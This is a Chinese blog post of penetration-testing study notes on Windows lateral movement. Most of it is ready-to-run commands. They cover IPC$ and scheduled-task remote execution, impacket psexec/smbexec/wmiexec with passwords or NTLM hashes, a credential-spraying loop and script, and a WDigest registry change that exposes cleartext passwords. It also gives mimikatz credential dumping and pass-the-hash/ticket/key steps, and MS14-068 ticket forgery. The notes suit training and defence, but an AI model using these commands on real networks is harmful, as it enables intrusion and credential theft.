<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="横向移动by小迪">
<meta property="og:type" content="article">
<meta property="og:title" content="横向移动 | xiaodisec">
<meta property="og:url" content="https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/index.html">
<meta property="og:site_name" content="killeveee">
<meta property="og:description" content="横向移动by小迪">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-08-06T07:11:33.000Z">
<meta property="article:modified_time" content="2023-12-24T05:42:22.036Z">
<meta property="article:author" content="killeveee">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>横向移动 | xiaodisec</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&text=横向移动 | xiaodisec"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&is_video=false&description=横向移动 | xiaodisec"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=横向移动 | xiaodisec&body=Check out this article: https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&name=横向移动 | xiaodisec&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&t=横向移动 | xiaodisec"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">at&amp;schtasks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">at</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">schtasks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">atexec-impacket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">批量利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">psexec&amp;smbexec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">smbexec</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">wmic&amp;wmiexec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">PTH&amp;PTT&amp;PTK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.1.</span> <span class="toc-text">PTH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text">PTK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.3.</span> <span class="toc-text">PTT</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">RDP</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        横向移动 | xiaodisec
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">killeveee</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-08-06T07:11:33.000Z" class="dt-published" itemprop="datePublished">2022-08-06</time>
        
      
    </div>

      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
    </div>


      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1><span id="atampschtasks">at&amp;schtasks</span></h1><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？</p>
<p>在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。</p>
<p>获取到某域主机权限 –&gt; minikatz得到密码（明文，hash）–&gt; 用到信息收集里面域用户的列表做用户名字典 –&gt; 用到密码明文当做密码字典 –&gt; 尝试连接 –&gt; 创建计划任务(at|schtasks) –&gt; 执行文件（后门或命令）</p>
<p>利用流程：</p>
<ol>
<li>建立IPC连接到目标主机</li>
<li>拷贝要执行的命令脚本或木马到目标主机</li>
<li>查看目标时间，创建计划任务定时执行脚本</li>
<li>删除IPC连接</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">#建立IPC连接
net use \\10.1.1.1\IPC$ &quot;passwd&quot; &#x2F;user:username  #工作组
net use \\10.1.1.1\IPC$ &quot;passwd&quot; &#x2F;user:domainname\username  #域

dir \\10.1.1.1\c$\					#查看文件列表
copy \\10.1.1.1\c$\1.bat 1.bat 		#下载文件
copy 1.bat \\10.1.1.1\c$			#上传文件
net use \\10.1.1.1\IPC$ &#x2F;del		#删除IPC连接
net view 10.1.1.1					#查看对方共享

建立IPC失败的原因：
1. 目标系统不是NT或以上的操作系统
2. 对方没有打开IPC$共享
3. 对方未开启139、445端口，或者被防火墙屏蔽
4. 账号密码错了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2><span id="at">at</span></h2><p><code>&lt;Windows2012</code></p>
<p>建立ipc连接，然后把执行文件copy上去，再使用at命令添加计划任务。</p>
<pre class="line-numbers language-none"><code class="language-none">at \\10.1.1.1\ 11:30 C:\hh.bat
at \\10.1.1.1    1 &#x2F;delete
&#x2F;&#x2F; 1为计划任务的ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<h2><span id="schtasks">schtasks</span></h2><p><code>&gt;=windows2012</code></p>
<p>建立ipc连接，然后把执行文件copy上去，再使用schtasks命令添加计划任务。</p>
<pre class="line-numbers language-none"><code class="language-none">#在10.1.1.1创建任务名为adduser，每天执行的，文件路径为C:\add.bat的任务
schtasks &#x2F;create &#x2F;s 10.1.1.1 &#x2F;ru &quot;SYSTEM&quot; &#x2F;tn adduser &#x2F;sc DAILY &#x2F;tr C:\add.bat &#x2F;F

#运行adduser任务
schtasks &#x2F;run &#x2F;s 10.1.1.1 &#x2F;tn adduser &#x2F;i

#删除adduser任务
schtasks &#x2F;delete &#x2F;s 10.1.1.1 &#x2F;tn adduser &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2><span id="atexec-impacket">atexec-impacket</span></h2><p>可以看到以上两种方法都是明文密码，但是我们信息搜集的时候可能会得到hash值，就没有办法去连接。这里使用一款工具<code>impacket</code>里的<code>atexec</code>。</p>
<p>可以直接使用命令，但是不免杀。</p>
<pre class="line-numbers language-none"><code class="language-none">atexec.exe administrator:666.com@10.1.1.1 &quot;whoami&quot;
atexec.exe ZJ&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
atexec.exe -hashes :6f8a61c6702f90ae246aa2a298fcdc35333 administrator@10.1.1.1 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<h2><span id="批量利用">批量利用</span></h2><p>俭朴版：</p>
<pre class="line-numbers language-none"><code class="language-none">#扫到存活ip后保存在一个ips.txt的文件,pass.txt、hash.txt是由mimikatz来的.

FOR &#x2F;F %%i in (ips.txt) do net use \\%%i\IPC$ &quot;666.com&quot; &#x2F;user:administrator	#变量ip

FOR &#x2F;F %%i in (ips.txt) do atexec.exe .&#x2F;administrator:666.com@%%i &quot;whoami&quot;	#变量ip

FOR &#x2F;F %%i in (pass.txt) do atexec.exe .&#x2F;administrator:%%i@10.1.1.1 &quot;whoami&quot; #变量pass

FOR &#x2F;F %%i in (hash.txt) do atexec.exe -hashes :%%i .&#x2F;administrator@10.1.1.1 &quot;whoami&quot; #变量hash <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>升级版：</p>
<p>写脚本，把ip、passwd、username都变三重循环。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>time
ips<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">'10.1.1.1'</span><span class="token punctuation">,</span>
    <span class="token string">'10.1.1.2'</span>
<span class="token punctuation">&#125;</span>

users<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">'jiarong.gao'</span><span class="token punctuation">,</span>
    <span class="token string">'ping.fang'</span>
<span class="token punctuation">&#125;</span>

passwd<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">'666.com'</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">for</span> ip <span class="token keyword">in</span> ips<span class="token punctuation">:</span>
    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>
        <span class="token keyword">for</span> mima <span class="token keyword">in</span> passwd<span class="token punctuation">:</span>
        	payld<span class="token operator">=</span><span class="token string">"net use \\"</span><span class="token operator">+</span> "\"<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">'\ipc$ '</span><span class="token operator">+</span>mima<span class="token operator">+</span><span class="token string">' /user:'</span><span class="token operator">+</span>user
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--->'</span><span class="token operator">+</span>payld<span class="token operator">+</span><span class="token string">'&lt;---'</span><span class="token punctuation">)</span>
            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>payld<span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>将py文件变成exe文件：</strong></p>
<blockquote>
<p>D:\python\Scripts\pyinstaller.exe -F at_fuzz.py</p>
</blockquote>
<p>exe在dist文件夹里。</p>
<h1><span id="psexecampsmbexec">psexec&amp;smbexec</span></h1><p>win2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码。</p>
<p>win2012一下版本若安装KB2871997补丁，同样也会导致无法获取明文密码。</p>
<p>针对以上情况，有以下解决方案：</p>
<ol>
<li>利用哈希hash传递（pth，ptk等）进行移动</li>
<li>利用其他服务协议（SMB，WMI等）进行哈希移动</li>
<li>利用注册表操作开启Wdigest Auth值进行获取明文</li>
<li>利用工具或第三方平台（Hashcat）进行破解获取明文</li>
</ol>
<p>windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows2003以后，认证方式均为NTLM Hash。</p>
<p><strong>注册表修改</strong></p>
<pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2><span id="psexec">psexec</span></h2><p>第一种：先建立IPC连接，再使用psexec（需要明文或hash传递）</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\10.1.1.1\IPC$ &quot;666.com&quot; &#x2F;user:administrator
psexec \\10.1.1.1 -s cmd           #-s以System运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>第二种：不建立IPC连接。</p>
<pre class="line-numbers language-none"><code class="language-none">psexec \\10.1.1.1 -u administrator -p 666.com -s cmd
psexec -hashes :$HASH$ .&#x2F;administrator@10.1.1.1 
psexec -hashes :$HASH$ domain&#x2F;administrator@10.1.1.1 
psexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用hashes传递时可能会出错，我们可以使用impacket工具包里的psexec，这个是基于官方的psexec二次开发的，可以进行hash的传递。但是容易被杀。</p>
<h2><span id="smbexec">smbexec</span></h2><p>也是impacket工具包的一个软件。</p>
<p>不用IPC连接</p>
<pre class="line-numbers language-none"><code class="language-none">smbexec ZJ&#x2F;administrator:666.com@10.1.1.1
smbexec .&#x2F;administrator:666.com@10.1.1.1
smbexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ&#x2F;administrator@10.1.1.1
smbexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h1><span id="wmicampwmiexec">wmic&amp;wmiexec</span></h1><p>WMI是通过<strong>135</strong>端口进行利用。支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。需要提权。</p>
<p>#自带WMIC 明文传递 无回显</p>
<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:10.1.1.1 &#x2F;user:administrator &#x2F;password:666.com process call create &quot;cmd.exe &#x2F;c ipconfig &gt;C:\1.txt&quot;
命令结果在1.txt里，且保存在10.1.1.1的电脑里。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>#自带cscript明文传输 有回显</p>
<pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 10.1.1.1 administrator 666.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>#套件impacket的wmiexec  明文或hash传递 有回显exe版本</p>
<pre class="line-numbers language-none"><code class="language-none">wmiexec .&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
wmiexec ZJ&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1 &quot;whoami&quot;
wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ&#x2F;administrator@10.1.1.1 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h1><span id="pthamppttampptk">PTH&amp;PTT&amp;PTK</span></h1><ul>
<li>PTH(pass the hash)		#利用LM或NTLM的值进行的渗透测试</li>
<li>PTT(pass the ticket)        #利用的票据凭证TGT进行的渗透测试</li>
<li>PTK(pass the key)            #利用的AES-256进行的渗透测试</li>
</ul>
<p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM hash访问远程主机或服务，而不用提供明文密码。</p>
<p>如果禁用了NTLM认证。PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1&#x2F;2012r2，安装补丁kb2871997的Win7&#x2F;2009r2&#x2F;8&#x2F;2012等，可以使用AES keys代替NT hash 来实现PTK攻击。</p>
<p>pth：没打补丁域用户和本地administrator可以连接，打了补丁也没啥影响。</p>
<p>ptk：打了补丁才能用户才可以连接，采用AES256连接。</p>
<h2><span id="pth">PTH</span></h2><p>ntlm 传递，工具：mimikatz</p>
<p>首先用mimikatz得到ntlm值。</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>未打补丁的工作组及域连接：</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zj &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35
sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然后会弹出一个cmd窗口，可以直接进行连接。</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\10.1.1.1\IPC$
dir \\10.1.1.1\c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h2><span id="ptk">PTK</span></h2><p>打了补丁<strong>kb2871997</strong>才能用</p>
<p>首先要得到AES256的值，mimikatz：</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::ekeys

sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zj.com &#x2F;aes256:6f88e6d06c3ecb95e37fe23b3ef372738ec67871b71606c588a1668ca62161ac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h2><span id="ptt">PTT</span></h2><p><strong>第一种</strong>利用漏洞：</p>
<p>能实现普通用户直接获取域控system权限</p>
<p>#MS14-068 powershell执行</p>
<p>1.查看当前sid </p>
<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2.mimikaz   </p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge			&#x2F;&#x2F;清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造。
kerberos::list			&#x2F;&#x2F;查看当前机器凭证
kerberos::ptc 票据文件	 &#x2F;&#x2F;将票据注入到内存中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>3.利用MS14-068生成TGT数据</p>
<pre class="line-numbers language-none"><code class="language-none">ms14-068.exe -u 域成员名@域名 -s sid -d 域控地址 -p 域成员密码
MS14-068.exe -u jiarong.gao@zj.com -s S-1-5-21-3032773461-2117130829-2438403642-1103 -d 10.1.1.1 -p 666.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>4.票据注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::ptc TGT_mary@zj.com.ccache&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>5.查看凭证列表</p>
<pre class="line-numbers language-none"><code class="language-none">klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>6.利用</p>
<pre class="line-numbers language-none"><code class="language-none">dir \\10.1.1.1\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>第二种</strong>利用工具kekeo</p>
<p>1.生成票据</p>
<pre class="line-numbers language-none"><code class="language-none">kekeo &quot;tgt::ask &#x2F;user:jiarong.gao &#x2F;domain:zj.com &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2.导入票据</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt 票据名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2.查看凭证</p>
<pre class="line-numbers language-none"><code class="language-none">klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>4.利用net use 载入</p>
<pre class="line-numbers language-none"><code class="language-none">dir \\10.1.1.1\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>第三种</strong>利用本地票据（管理员权限）、</p>
<pre class="line-numbers language-none"><code class="language-none">sekurlsa::tickets &#x2F;export
kerberos::ptt xxxxxxxx.xxxx.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h1><span id="rdp">RDP</span></h1><p>与linux的ssh协议类似，这是windows的远程桌面连接（图形）的协议，端口为<strong>3389</strong></p>
<p>RDP明文密码连接</p>
<pre class="line-numbers language-none"><code class="language-none">windows:	mstsc
mstsc.exe &#x2F;console &#x2F;v:10.1.1.1 &#x2F;administrator

linux: rdesktop 10.1.1.1:3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>RDP密文HASH链接</p>
<p>windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win7 和Windows Server 2008 R2安装了KB2871997、KB2973351补丁也支持。</p>
<p>开启命令：</p>
<pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后：</p>
<pre class="line-numbers language-none"><code class="language-none">mstsc.exe &#x2F;restrictedadmin
mimikatz.exe
privilege::debug
sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zj &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<hr>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a href="/categories/">分类</a></li>
        
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">at&amp;schtasks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">at</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">schtasks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">atexec-impacket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">批量利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">psexec&amp;smbexec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">smbexec</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">wmic&amp;wmiexec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">PTH&amp;PTT&amp;PTK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.1.</span> <span class="toc-text">PTH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text">PTK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.3.</span> <span class="toc-text">PTT</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">RDP</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&text=横向移动 | xiaodisec"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
